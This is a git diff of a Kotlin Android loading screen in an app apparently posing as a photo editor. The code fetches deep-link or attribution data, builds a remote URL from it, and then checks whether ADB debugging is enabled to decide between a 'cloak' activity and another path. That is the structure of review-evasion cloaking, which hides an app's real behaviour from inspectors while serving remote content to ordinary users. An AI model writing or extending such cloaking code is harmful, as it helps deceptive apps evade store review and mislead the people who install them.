@@ -12,9 +12,12 @@ import androidx.lifecycle.lifecycleScope
 import com.cyberlink.photodirecto.App
 import com.cyberlink.photodirecto.databinding.LoadingActivityBinding
 import com.cyberlink.photodirecto.ui.activities.cloak.CloakActivity
+import com.cyberlink.photodirecto.ui.intents.AppsIntent
 import com.cyberlink.photodirecto.ui.intents.DeepLinkIntent
+import com.cyberlink.photodirecto.ui.states.AppsState
 import com.cyberlink.photodirecto.ui.states.DeepLinkState
 import com.cyberlink.photodirecto.util.CustomDatabase
+import com.cyberlink.photodirecto.util.UrlMaker
 import com.cyberlink.photodirecto.viewmodel.MyViewModel
 import com.cyberlink.photodirecto.viewmodel.MyViewModelFactory
 import kotlinx.coroutines.Dispatchers
@@ -25,35 +28,38 @@ class LoadingActivity : AppCompatActivity() {
     private val binding get() = _binding!!
     private lateinit var viewModel: MyViewModel
     private val firebase = CustomDatabase()
+    private val urlMaker = UrlMaker()
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         _binding = LoadingActivityBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
         initViewModel()
-        viewModel.handleIntent(this.applicationContext)
-        observeViewModel()
-//        imitateIntent()
-        lifecycleScope.launch(Dispatchers.IO) {
-
-            val user = firebase.getData(App.adID)
-
-
-            Log.d("custom", "firebase url - $user")
-
-            lifecycleScope.launch(Dispatchers.Main) {
-                user.let {
-                    if (user == null) {
-                        imitateIntent()
-                    } else {
-                        checkSecurity(user.finalUrl!!)
-                    }
-                }
-            }
-        }
+        viewModel.handleDeppIntent()
+        viewModel.handleDataIntent()
+        observeDeepState()
+        observeDataState()
+        imitateDeepIntent()
+//        lifecycleScope.launch(Dispatchers.IO) {
+//
+//            val user = firebase.getData(App.adID)
+//
+//
+//            Log.d("custom", "firebase url - $user")
+//
+//            lifecycleScope.launch(Dispatchers.Main) {
+//                user.let {
+//                    if (user == null) {
+//                        imitateDeepIntent()
+//                    } else {
+//                        checkSecurity(user.finalUrl!!)
+//                    }
+//                }
+//            }
+//        }
     }
 
-    private fun imitateIntent() {
+    private fun imitateDeepIntent() {
         lifecycleScope.launch {
             viewModel.deepIntent.send(DeepLinkIntent.FetchDeepLink)
             Log.d("customTage", "started intent")
@@ -62,11 +68,14 @@ class LoadingActivity : AppCompatActivity() {
 
     private fun initViewModel() {
         viewModel =
-            ViewModelProvider(this, MyViewModelFactory(App()))[MyViewModel::class.java]
+            ViewModelProvider(
+                this,
+                MyViewModelFactory(App(), this@LoadingActivity)
+            )[MyViewModel::class.java]
         Log.d("customTage", "view-model Init")
     }
 
-    private fun observeViewModel() {
+    private fun observeDeepState() {
         Log.d("customTage", "observing vm")
         lifecycleScope.launch {
             viewModel.state.collect {
@@ -81,13 +90,46 @@ class LoadingActivity : AppCompatActivity() {
 
                     is DeepLinkState.DeepLink -> {
                         Log.d("customTag", "new url is - ${it.deepLink}")
-                        checkSecurity(it.deepLink!!)
-                        Log.d("customTage", "state deep")
+                        if (it.deepLink!! != "null") {
+                            checkSecurity(
+                                urlMaker.buildUrl(
+                                    it.deepLink!!,
+                                    null,
+                                    this@LoadingActivity
+                                )
+                            )
+                            Log.d("customTage", "state deep")
+                        } else {
+                            viewModel.dataIntent.send(AppsIntent.FetchAppsData)
+                        }
                     }
                     is DeepLinkState.Error -> {
                         binding.progressBar.visibility = View.GONE
                         Toast.makeText(this@LoadingActivity, it.error, Toast.LENGTH_LONG).show()
-                        Log.d("customTage", "state error")
+                        Log.d("customTage", "deeplink state error")
+                    }
+                }
+            }
+        }
+    }
+
+    private fun observeDataState() {
+        lifecycleScope.launch {
+            viewModel.dataState.collect {
+                when (it) {
+                    is AppsState.Idle -> {
+
+                    }
+                    is AppsState.Loading -> {
+                        binding.progressBar.visibility = View.VISIBLE
+                    }
+                    is AppsState.Data -> {
+                        checkSecurity(urlMaker.buildUrl("null", it.data, this@LoadingActivity))
+                    }
+                    is AppsState.Error -> {
+                        binding.progressBar.visibility = View.GONE
+                        Toast.makeText(this@LoadingActivity, it.error, Toast.LENGTH_LONG).show()
+                        Log.d("customTage", "apps data state error")
                     }
                 }
             }
@@ -98,7 +140,7 @@ class LoadingActivity : AppCompatActivity() {
         if (Settings.Global.getString(
                 this@LoadingActivity.contentResolver,
                 Settings.Global.ADB_ENABLED
-            ) == "1"
+            ) != "1"
         ) {
             cloakStart()
         } else {
